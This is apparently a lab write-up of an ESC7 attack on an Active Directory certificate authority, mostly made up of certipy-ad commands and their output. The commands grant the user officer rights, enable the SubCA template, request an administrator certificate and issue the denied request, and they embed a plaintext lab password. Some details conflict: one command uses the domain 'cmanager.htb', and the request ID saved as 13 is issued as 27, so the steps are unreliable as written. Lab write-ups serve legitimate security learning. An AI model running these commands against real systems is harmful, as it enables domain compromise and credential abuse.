Vulnerable Certificate Authority Access Control - ESC7

We can try a ESC7 attack, the prerequisites are:
→ Only ManageCA permission
→ Manage Certificates , which we don’t have but can be granted from ManageCA
→ Certificate template SubCA must be enabled (can be enabled from ManageCA)
This attack works because users with "Manage CA" and "Manage Certificates" rights can request certificates that are initially rejected. The SubCA certificate template has a vulnerability (ESC1), but only administrators can use it. So, a regular user can ask to use the SubCA template, get denied, but then have an admin approve it.
  1. granting ourselves the Manage Certificates access
    certipy-ad ca -ca 'manager-DC01-CA' -add-officer raven -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
  2. Enable SubCA 
    certipy-ad ca -ca 'manager-DC01-CA' -u raven@cmanager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236  -enable-template 'SubCA'

[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
  3. This request will be denied, but we will save the private key and note down the request ID 
    certipy-ad req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target 10.10.11.236 -template SubCA -upn administrator@manager.htb

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 13
Would you like to save the private key? (y/N) y
[*] Saved private key to 13.key

  4. we can then issue the failed certificate request 
    certipy-ad ca -ca 'manager-DC01-CA' -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -issue-request 27
